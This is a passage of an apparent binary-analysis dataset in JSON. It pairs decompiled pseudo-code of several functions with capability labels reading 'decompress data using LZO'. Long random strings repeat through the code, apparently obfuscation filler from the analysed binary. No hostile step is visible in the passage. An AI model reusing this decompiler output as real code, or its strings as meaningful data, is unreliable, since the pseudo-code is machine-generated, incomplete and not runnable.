< (in_stack_00000014 + -4) - iVar2)) goto code_r0x0044546b;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = puStack72;\n        return 0x9482;\n    }\n    iVar2 = iStack200;\n    if ((uStack180 + 1 < 0x1000) || (iVar2 = *(iStack200 + -4),  (iStack200 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00445247;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\ncode_r0x00445423:\n    uStack64 = 1;\n    fcn.004047f5();\ncode_r0x0044542f:\n    uStack64 = 2;\n    fcn.004047f5();\ncode_r0x0044543b:\n    uStack64 = 3;\n    fcn.004047f5();\ncode_r0x00445447:\n    uStack64 = 4;\n    fcn.004047f5();\ncode_r0x00445453:\n    uStack64 = 5;\n    fcn.004047f5();\ncode_r0x0044545f:\n    uStack64 = 6;\n    fcn.004047f5();\ncode_r0x0044546b:\n    uStack64 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 2180
    },
    "004455c0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.004455c0(void)\n\n{\n    int32_t arg_8h;\n    int32_t **in_FS_OFFSET;\n    uint auStack72 [2];\n    char *pcStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack72;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cc80;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    pcStack64 = \"nwktctdnlmazexrywmitlomuzwnlmqnyqhcofhiytro\";\n    auStack72[0] = 0x2b;\n    fcn.00402f72();\n    if (0xf < uStack40) {\n        arg_8h = iStack60;\n        if ((0xfff < uStack40 + 1) && (arg_8h = *(iStack60 + -4),  0x1f < (iStack60 + -4) - arg_8h)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            return *0x542930;\n        }\n        fcn.00401a32(arg_8h);\n    }\n    *in_FS_OFFSET = piStack28;\n    return *0x54292c;\n}\n",
        "token_count": 369
    },
    "004456b0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.004456b0(uint *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t aiStack104 [4];\n    uint uStack88;\n    uint32_t uStack84;\n    uchar uStack80;\n    int32_t *piStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    uint *puStack60;\n    int32_t iStack56;\n    int32_t in_stack_ffffffd8;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint32_t uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack60 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cc90;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    param_1[5] = 0xf;\n    param_1[4] = 9;\n    *param_1 = 0x62746679;\n    param_1[1] = 0x61706877;\n    *(param_1 + 2) = 0x69;\n    if (in_stack_0000001c < 0x10) {\ncode_r0x00445738:\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iStack56 = param_2;\n    if ((in_stack_0000001c + 1 < 0x1000) || (iStack56 = *(param_2 + -4),  (param_2 + -4) - iStack56 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack56);\n        goto code_r0x00445738;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    piStack76 = aiStack104;\n    uStack68 = 0x44cca0;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    uStack88 = 0;\n    uStack84 = 0xf;\n    aiStack104[0] = 0;\n    uStack64 = 3;\n    fcn.00402f72(100, uStack80, \n                 \"grqxvvowzyiengnstcpqhynikxhtgxwjgqhrsawgkaztqnnxqjtyajuttxvqpgjhvivbojluisvsrrzdidztopfpumvlkbndcxdp\")\n    ;\n    if (uStack84 < 0x10) {\ncode_r0x00445819:\n        if (0xf < uStack20) {\n            iVar2 = in_stack_ffffffd8;\n            if ((0xfff < uStack20 + 1) && (iVar2 = *(in_stack_ffffffd8 + -4),  0x1f < (in_stack_ffffffd8 + -4) - iVar2))\n            goto code_r0x004458b8;\n            fcn.00401a32(iVar2);\n        }\n        uStack24 = 0;\n        uStack20 = 0xf;\n        if (0xf < param_1) {\n            iVar2 = unaff_ESI;\n            if ((0xfff < param_1 + 1U) && (iVar2 = *(unaff_ESI + -4),  0x1f < (unaff_ESI + -4) - iVar2))\n            goto code_r0x004458c4;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack72;\n        return piStack72;\n    }\n    iVar2 = aiStack104[0];\n    if ((uStack84 + 1 < 0x1000) || (iVar2 = *(aiStack104[0] + -4),  (aiStack104[0] + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00445819;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\ncode_r0x004458b8:\n    uStack64 = 1;\n    fcn.004047f5();\ncode_r0x004458c4:\n    uStack64 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1099
    },
    "00446400": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00446400(void)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint32_t unaff_retaddr;\n    int32_t in_stack_00000010;\n    uint32_t in_stack_00000024;\n    uint32_t in_stack_ffffff38;\n    uint uStack168;\n    uchar uStack164;\n    char *pcStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    uint *puStack132;\n    uint32_t uStack128;\n    uint uStack112;\n    uint32_t uStack108;\n    int32_t iStack104;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar uStack80;\n    uint *puStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint *in_stack_ffffffd8;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    int32_t iStack20;\n    \n    ppuStack32 = &ppuStack32;\n    iStack20 = 0xffffffff;\n    uStack24 = 0x44cce0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (in_stack_00000024 < 0x10) {\ncode_r0x00446464:\n        *in_FS_OFFSET = piStack28;\n        return 0x160dc;\n    }\n    iStack60 = in_stack_00000010;\n    if ((in_stack_00000024 + 1 < 0x1000) ||\n       (iStack60 = *(in_stack_00000010 + -4),  (in_stack_00000010 + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n        goto code_r0x00446464;\n    }\n    iStack20 = 0;\n    fcn.004047f5();\n    puStack132 = in_stack_ffffffd8;\n    fcn.004052d1();\n    puStack76 = &uStack168;\n    uStack68 = 0x44ccf0;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack64 = 6;\n    uStack164 = iStack104;\n    pcStack160 = \"dsmxergzskunlmwsvbfntuyoyuahotgvnghqjbftakplagpiuqhrbcbxgaymbq\";\n    uStack168 = 0x3e;\n    puVar1 = puStack132;\n    fcn.00402f72();\n    uStack88 = 0;\n    uStack84 = 0xf;\n    iStack104 = 0;\n    uStack64 = 7;\n    fcn.00402f72(0x3e, uStack128, \"dsmxergzskunlmwsvbfntuyoyuahotgvnghqjbftakplagpiuqhrbcbxgaymbq\");\n    uStack112 = 0;\n    uStack108 = 0xf;\n    uStack128 = 0;\n    uStack64 = 9;\n    fcn.00402f72(0x3e, uStack80, \"dsmxergzskunlmwsvbfntuyoyuahotgvnghqjbftakplagpiuqhrbcbxgaymbq\");\n    if (uStack108 < 0x10) {\ncode_r0x004465d0:\n        if (0xf < uStack84) {\n            in_stack_ffffff38 = uStack84 + 1;\n            iVar3 = iStack104;\n            if (0xfff < in_stack_ffffff38) {\n                iVar3 = *(iStack104 + -4);\n                if (0x1f < (iStack104 + -4) - iVar3) goto code_r0x004467b1;\n                in_stack_ffffff38 = uStack84 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack88 = 0;\n        uStack84 = 0xf;\n        iStack104 = 0;\n        uStack64 = 7;\n        fcn.00402f72(0x3e, in_stack_ffffff38 & 0xffffff00 | uStack128 & 0xff, \n                     \"dsmxergzskunlmwsvbfntuyoyuahotgvnghqjbftakplagpiuqhrbcbxgaymbq\");\n        uStack112 = 0;\n        uStack108 = 0xf;\n        uStack128 = 0;\n        uStack64 = 8;\n        fcn.00402f72(0x3e, uStack80, \"dsmxergzskunlmwsvbfntuyoyuahotgvnghqjbftakplagpiuqhrbcbxgaymbq\");\n        if (0xf < uStack108) {\n            uVar2 = uStack128;\n            if ((0xfff < uStack108 + 1) && (uVar2 = *(uStack128 - 4),  0x1f < (uStack128 - 4) - uVar2))\n            goto code_r0x004467bd;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack84) {\n            iVar3 = iStack104;\n            if ((0xfff < uStack84 + 1) && (iVar3 = *(iStack104 + -4),  0x1f < (iStack104 + -4) - iVar3))\n            goto code_r0x004467c9;\n            fcn.00401a32(iVar3);\n        }\n        *puStack132 = 0;\n        puStack132[5] = 0xf;\n        puStack132[4] = 0;\n        *puStack132 = 0;\n        if (0xf < uStack136) {\n            iVar3 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar3 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar3))\n            goto code_r0x004467d5;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < unaff_retaddr) {\n            iVar3 = iStack20;\n            if ((0xfff < unaff_retaddr + 1) && (iVar3 = *(iStack20 + -4),  0x1f < (iStack20 + -4) - iVar3))\n            goto code_r0x004467e1;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack72;\n        return puVar1;\n    }\n    in_stack_ffffff38 = uStack108 + 1;\n    uVar2 = uStack128;\n    if (in_stack_ffffff38 < 0x1000) {\ncode_r0x004465c4:\n        fcn.00401a32(uVar2);\n        goto code_r0x004465d0;\n    }\n    uVar2 = *(uStack128 - 4);\n    if ((uStack128 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff38 = uStack108 + 0x24;\n        goto code_r0x004465c4;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\ncode_r0x004467b1:\n    uStack64 = 1;\n    fcn.004047f5();\ncode_r0x004467bd:\n    uStack64 = 2;\n    fcn.004047f5();\ncode_r0x004467c9:\n    uStack64 = 3;\n    fcn.004047f5();\ncode_r0x004467d5:\n    uStack64 = 4;\n    fcn.004047f5();\ncode_r0x004467e1:\n    uStack64 = 5;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1962
    },
    "00446ab0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Heritage AFTER dead removal. Example location: s0xfffffff8 : 0x00446bc5\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint * fcn.00446ab0(uint param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uchar **ppuVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint32_t unaff_ESI;\n    uchar *unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    uint uStack264;\n    uchar uStack260;\n    char *pcStack256;\n    int32_t iStack252;\n    uint uStack236;\n    uint32_t uStack232;\n    int32_t iStack228;\n    uint uStack212;\n    uint32_t uStack208;\n    int32_t iStack204;\n    uint uStack188;\n    uint32_t uStack184;\n    uchar uStack180;\n    uint *puStack176;\n    int32_t *piStack172;\n    uint uStack168;\n    uint uStack164;\n    int32_t iStack160;\n    uchar *puStack156;\n    uchar **ppuStack132;\n    int32_t *piStack128;\n    uint uStack124;\n    uint uStack120;\n    uchar *puStack116;\n    uchar *puStack112;\n    uint32_t uStack96;\n    uchar **ppuStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint *in_stack_ffffffd8;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *in_stack_fffffff8;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cd10;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (in_stack_00000020 < 0x10) {\ncode_r0x00446b14:\n        *in_FS_OFFSET = piStack28;\n        return 0xc947;\n    }\n    iStack60 = param_3;\n    if ((in_stack_00000020 + 1 < 0x1000) || (iStack60 = *(param_3 + -4),  (param_3 + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n        goto code_r0x00446b14;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    puStack156 = in_stack_fffffff8;\n    fcn.004052d1();\n    ppuStack76 = &ppuStack76;\n    puStack116 = &stack0xffffffd8;\n    uStack64 = 0xffffffff;\n    uStack68 = 0x44cd20;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    in_stack_ffffffd8[5] = 0xf;\n    in_stack_ffffffd8[4] = 0xe;\n    *in_stack_ffffffd8 = 0x736f6c6d;\n    in_stack_ffffffd8[1] = 0x766c7a6c;\n    in_stack_ffffffd8[2] = 0x77757969;\n    *(in_stack_ffffffd8 + 3) = 0x636b;\n    *(in_stack_ffffffd8 + 0xe) = 0;\n    ppuVar1 = &ppuStack76;\n    if (unaff_ESI < 0x10) {\ncode_r0x00446be3:\n        ppuStack76 = ppuVar1;\n        uStack20 = 0;\n        if (param_2 < 0x10) {\ncode_r0x00446c29:\n            *in_FS_OFFSET = piStack72;\n            return in_stack_ffffffd8;\n        }\n        puStack156 = unaff_EDI;\n        if ((param_2 + 1 < 0x1000) || (puStack156 = *(unaff_EDI + -4),  unaff_EDI + (-4 - puStack156) < 0x20)) {\n            fcn.00401a32(puStack156);\n            goto code_r0x00446c29;\n        }\n    }\n    else {\n        puVar4 = &stack0xfffffffc;\n        if ((unaff_ESI + 1 < 0x1000) || (puVar4 = puStack156,  &stack0xfffffff8 + -puStack156 < 0x20)) {\n            ppuStack76 = &ppuStack76;\n            fcn.00401a32(puVar4);\n            ppuVar1 = ppuStack76;\n            goto code_r0x00446be3;\n        }\n        uStack64 = 0;\n        fcn.004047f5();\n    }\n    uStack64 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    ppuStack132 = &ppuStack132;\n    uStack120 = 0xffffffff;\n    uStack124 = 0x44cd30;\n    piStack128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack128;\n    if (in_stack_ffffffd8 < 0x10) {\ncode_r0x00446ce4:\n        *in_FS_OFFSET = piStack128;\n        return 0x1;\n    }\n    iStack160 = iStack60;\n    puStack112 = puStack156;\n    if ((in_stack_ffffffd8 + 1U < 0x1000) || (iStack160 = *(iStack60 + -4),  (iStack60 + -4) - iStack160 < 0x20)) {\n        ppuStack132 = &ppuStack132;\n        fcn.00401a32(iStack160);\n        goto code_r0x00446ce4;\n    }\n    uStack120 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack176 = &uStack264;\n    uStack168 = 0x44cd40;\n    piStack172 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack172;\n    uStack236 = 0;\n    uStack232 = 0xf;\n    iStack252 = 0;\n    uStack164 = 4;\n    uStack260 = iStack204;\n    pcStack256 = \"vhnyedoyodzrspvffskkynklzxiswkikbpbwivbustdqinybmwxgoxxpzzwfhbleipebuk\";\n    uStack264 = 0x46;\n    fcn.00402f72();\n    uStack188 = 0;\n    uStack184 = 0xf;\n    iStack204 = 0;\n    uStack164 = 5;\n    fcn.00402f72(0x46, iStack228, \"vhnyedoyodzrspvffskkynklzxiswkikbpbwivbustdqinybmwxgoxxpzzwfhbleipebuk\");\n    uStack212 = 0;\n    uStack208 = 0xf;\n    iStack228 = 0;\n    uStack164 = 6;\n    fcn.00402f72(0x46, uStack180, \"vhnyedoyodzrspvffskkynklzxiswkikbpbwivbustdqinybmwxgoxxpzzwfhbleipebuk\");\n    if (uStack208 < 0x10) {\ncode_r0x00446e4a:\n        if (0xf < uStack184) {\n            iVar3 = iStack204;\n            if ((0xfff < uStack184 + 1) && (iVar3 = *(iStack204 + -4),  0x1f < (iStack204 + -4) - iVar3))\n            goto code_r0x00446f16;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack232) {\n            iVar3 = iStack252;\n            if ((0xfff < uStack232 + 1) && (iVar3 = *(iStack252 + -4),  0x1f < (iStack252 + -4) - iVar3))\n            goto code_r0x00446f22;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack96) {\n            puVar4 = puStack116;\n            if ((0xfff < uStack96 + 1) && (puVar4 = *(puStack116 + -4),  0x1f < puStack116 + (-4 - puVar4)))\n            goto code_r0x00446f2e;\n            fcn.00401a32(puVar4);\n        }\n        *in_FS_OFFSET = piStack172;\n        return 0x1;\n    }\n    iVar3 = iStack228;\n    if ((uStack208 + 1 < 0x1000) || (iVar3 = *(iStack228 + -4),  (iStack228 + -4) - iVar3 < 0x20)) {\n        fcn.00401a32(iVar3);\n        goto code_r0x00446e4a;\n    }\n    uStack164 = 0;\n    fcn.004047f5();\ncode_r0x00446f16:\n    uStack164 = 1;\n    fcn.004047f5();\ncode_r0x00446f22:\n    uStack164 = 2;\n    fcn.004047f5();\ncode_r0x00446f2e:\n    uStack164 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar2 = fcn.00403a76();\n    return puVar2;\n}\n",
        "token_count": 2277
    },
    "00449de0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint * __fastcall fcn.00449de0(uint *param_1)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t *in_FS_OFFSET;\n    int32_t aiStack112 [5];\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uint uStack72;\n    uint32_t uStack68;\n    uint *puStack64;\n    uint *puStack60;\n    uint *puStack56;\n    uint *puStack52;\n    uint *puStack48;\n    int32_t *piStack44;\n    int32_t *piStack40;\n    uchar uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack40 = &stack0xffffff90;\n    puStack32 = &stack0xffffff90;\n    uStack24 = 0x44cde0;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    *param_1 = 0;\n    param_1[4] = 0;\n    param_1[5] = 0xf;\n    *param_1 = 0;\n    puStack64 = param_1 + 8;\n    param_1[8] = 0;\n    param_1[0xc] = 0;\n    param_1[0xd] = 0xf;\n    *(param_1 + 8) = 0;\n    puStack60 = param_1 + 0xe;\n    param_1[0xe] = 0;\n    param_1[0x12] = 0;\n    param_1[0x13] = 0xf;\n    *(param_1 + 0xe) = 0;\n    puStack56 = param_1 + 0x17;\n    param_1[0x17] = 0;\n    param_1[0x1b] = 0;\n    param_1[0x1c] = 0xf;\n    *(param_1 + 0x17) = 0;\n    param_1[0x20] = 0;\n    param_1[0x24] = 0;\n    param_1[0x25] = 0xf;\n    *(param_1 + 0x20) = 0;\n    puStack52 = param_1 + 0x20;\n    uStack20 = 2;\n    puStack48 = param_1;\n    uVar2 = fcn.00403c56(&stack0xffffffa8, 0, 0x40c0c280, *0x542ad0, *0x542ad4, *0x542ad8, \n                         CONCAT22(*0x542adc >> 0x10, 0x6e));\n    piVar7 = piStack40;\n    if (0xf < uStack68) {\n        uVar5 = uStack68 + 1;\n        uVar3 = uStack88;\n        if (0xfff < uVar5) {\n            uVar3 = *(uStack88 - 4);\n            if (0x1f < (uStack88 - 4) - uVar3) {\n                uStack20 = 0;\n                piStack40[-1] = 0x44a0a6;\n                fcn.004047f5();\n                goto code_r0x0044a0a6;\n            }\n            uVar5 = uStack68 + 0x24;\n        }\n        piStack40[-1] = uVar5;\n        piVar7[-2] = uVar3;\n        piVar7[-3] = 0x449f31;\n        uVar2 = fcn.00401a32(piVar7[-2]);\n    }\n    piStack44 = piVar7;\n    uStack72 = 0;\n    uStack68 = 0xf;\n    uStack88 = uStack88 & 0xffffff00;\n    piVar7[-1] = uVar2;\n    piStack40 = piVar7 + -0x14;\n    piVar7[-10] = 0;\n    piVar7[-6] = 0;\n    piVar7[-5] = 0xf;\n    *(piVar7 + -10) = 0;\n    *(piVar7 + -0x16) = uStack36;\n    piVar7[-0x15] = \"ixwstxpwmgurudmbqrqujnpxeqptfvdoqnz\";\n    piVar7[-0x17] = 0x23;\n    piVar7[-0x18] = 0x449f8c;\n    fcn.00402f72();\n    puVar4 = piStack40;\n    piStack40[5] = 0xf;\n    puVar4[4] = 0xe;\n    *puVar4 = 0x6a707964;\n    puVar4[1] = 0x66677578;\n    puVar4[2] = 0x6b76656a;\n    *(puVar4 + 3) = 0x756d;\n    *(puVar4 + 0xe) = 0;\n    *(puVar4 + 6) = 1;\n    *(puVar4 + 7) = 0;\n    puVar4[8] = 0x3af;\n    puVar4[9] = 0xa0b;\n    puVar4[0x11] = 0x40bfaf00;\n    puVar4[0x10] = 0;\n    puVar4[0x12] = 0x742;\n    *(puVar4 + 0x13) = 1;\n    piVar7[-0x18] = 0x449fef;\n    uVar2 = fcn.0040443a();\n    piVar7 = piStack44;\n    piStack44[-1] = uVar2;\n    piStack40 = piVar7 + -9;\n    piVar7[-7] = 0;\n    piVar7[-3] = 0;\n    piVar7[-2] = 0xf;\n    *(piVar7 + -7) = 0;\n    *(piVar7 + -0xb) = uStack36;\n    piVar7[-10] = \"jcdtojifvswcobtkldgehckrpnagujxaatndhjuzcetkgpxwelxavgvsfqykh\";\n    piVar7[-0xc] = 0x3d;\n    piVar7[-0xd] = 0x44a037;\n    fcn.00402f72();\n    piVar1 = piStack40;\n    *piStack40 = &stack0xffffff90;\n    *(piVar1 + 1) = 1;\n    piVar1[8] = 0x442;\n    piVar7[-0xd] = 0x44a04f;\n    fcn.00401b9f();\n    piVar7 = piStack44;\n    if (0xf < uStack92) {\n        uVar5 = uStack92 + 1;\n        iVar6 = aiStack112[0];\n        if (0xfff < uVar5) {\n            iVar6 = *(aiStack112[0] + -4);\n            if (0x1f < (aiStack112[0] + -4) - iVar6) {\ncode_r0x0044a0a6:\n                uStack20 = 1;\n                piVar7[-1] = 0x44a0b2;\n                fcn.004047f5();\n                piVar7[-1] = &stack0xfffffffc;\n                piVar7[-0x16] = 0x44a0cc;\n                fcn.004052d1();\n                piVar7[-0x16] = &stack0x00000008;\n                piVar7[-0x2b] = 0x44a0dc;\n                fcn.004052d1();\n                piVar7[-0x2b] = &stack0x00000014;\n                piVar7[-0x40] = 0x44a0ef;\n                fcn.00403a76();\n                piVar7[-0x40] = 0x44a0f7;\n                fcn.00403a76();\n                piVar7[-0x40] = 0x44a0ff;\n                fcn.00403a76();\n                piVar7[-0x40] = 0x44a107;\n                fcn.00403a76();\n                piVar7[-0x40] = 0x44a10f;\n                puVar4 = fcn.00403a76();\n                return puVar4;\n            }\n            uVar5 = uStack92 + 0x24;\n        }\n        piStack44[-1] = uVar5;\n        piVar7[-2] = iVar6;\n        piVar7[-3] = 0x44a083;\n        fcn.00401a32(piVar7[-2]);\n    }\n    *in_FS_OFFSET = iStack28;\n    return puStack48;\n}\n",
        "token_count": 2072
    },
    "0044afb0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.0044afb0(uint32_t param_1, uint param_2, uint param_3, int32_t param_4, uint param_5, uint32_t param_6, \n                      uint param_7, uint param_8, uint32_t param_9)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t unaff_ESI;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_0000003c;\n    uint32_t in_stack_00000050;\n    uint32_t in_stack_fffffef4;\n    uint uStack212;\n    uchar uStack208;\n    char *pcStack204;\n    int32_t iStack200;\n    uint uStack184;\n    uint32_t uStack180;\n    int32_t iStack176;\n    uint uStack160;\n    uint32_t uStack156;\n    int32_t iStack152;\n    uint uStack136;\n    uint32_t uStack132;\n    uint32_t uStack128;\n    uint uStack112;\n    uint32_t uStack108;\n    int32_t iStack104;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar uStack80;\n    uint *puStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    uint32_t uStack60;\n    int32_t in_stack_ffffffd8;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint32_t uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44ce40;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (param_6 < 0x10) {\ncode_r0x0044b013:\n        *in_FS_OFFSET = piStack28;\n        return piStack28;\n    }\n    uStack60 = param_1;\n    if ((param_6 + 1 < 0x1000) || (uStack60 = *(param_1 - 4),  (param_1 - 4) - uStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(uStack60);\n        goto code_r0x0044b013;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack76 = &uStack212;\n    uStack68 = 0x44ce50;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    uStack184 = 0;\n    uStack180 = 0xf;\n    iStack200 = 0;\n    uStack64 = 0xb;\n    uStack208 = iStack176;\n    pcStack204 = \"rvafvpssjxjvaqreewaft\";\n    uStack212 = 0x15;\n    fcn.00402f72();\n    uStack160 = 0;\n    uStack156 = 0xf;\n    iStack176 = 0;\n    uStack64 = 0xc;\n    fcn.00402f72(0x1c, iStack152, \"fuxfwukzklperqbgtdilxbbudkng\");\n    uStack136 = 0;\n    uStack132 = 0xf;\n    iStack152 = 0;\n    uStack64 = 0xd;\n    fcn.00402f72(0x56, iStack104, \n                 \"uygribfxidklcfjackfyqkhixhxheailqzpvlxdcjtqvczysrhtogdlumqpzfolacggmjbobpxhmvmunbwbxjb\");\n    uStack88 = 0;\n    uStack84 = 0xf;\n    iStack104 = 0;\n    uStack64 = 0xe;\n    fcn.00402f72(0x15, uStack128, \"rvafvpssjxjvaqreewaft\");\n    uStack112 = 0;\n    uStack108 = 0xf;\n    uStack128 = 0;\n    uStack64 = 0x10;\n    fcn.00402f72(0x15, uStack80, \"rvafvpssjxjvaqreewaft\");\n    if (uStack108 < 0x10) {\ncode_r0x0044b20e:\n        if (0xf < uStack84) {\n            in_stack_fffffef4 = uStack84 + 1;\n            iVar1 = iStack104;\n            if (0xfff < in_stack_fffffef4) {\n                iVar1 = *(iStack104 + -4);\n                if (0x1f < (iStack104 + -4) - iVar1) goto code_r0x0044b53e;\n                in_stack_fffffef4 = uStack84 + 0x24;\n            }\n            fcn.00401a32(iVar1);\n        }\n        uStack88 = 0;\n        uStack84 = 0xf;\n        iStack104 = 0;\n        uStack64 = 0xe;\n        fcn.00402f72(0x56, in_stack_fffffef4 & 0xffffff00 | uStack128 & 0xff, \n                     \"uygribfxidklcfjackfyqkhixhxheailqzpvlxdcjtqvczysrhtogdlumqpzfolacggmjbobpxhmvmunbwbxjb\");\n        uStack112 = 0;\n        uStack108 = 0xf;\n        uStack128 = 0;\n        uStack64 = 0xf;\n        fcn.00402f72(0x56, uStack80, \n                     \"uygribfxidklcfjackfyqkhixhxheailqzpvlxdcjtqvczysrhtogdlumqpzfolacggmjbobpxhmvmunbwbxjb\");\n        if (0xf < uStack108) {\n            uVar2 = uStack128;\n            if ((0xfff < uStack108 + 1) && (uVar2 = *(uStack128 - 4),  0x1f < (uStack128 - 4) - uVar2))\n            goto code_r0x0044b54a;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack84) {\n            iVar1 = iStack104;\n            if ((0xfff < uStack84 + 1) && (iVar1 = *(iStack104 + -4),  0x1f < (iStack104 + -4) - iVar1))\n            goto code_r0x0044b556;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack132) {\n            iVar1 = iStack152;\n            if ((0xfff < uStack132 + 1) && (iVar1 = *(iStack152 + -4),  0x1f < (iStack152 + -4) - iVar1))\n            goto code_r0x0044b562;\n            fcn.00401a32(iVar1);\n        }\n      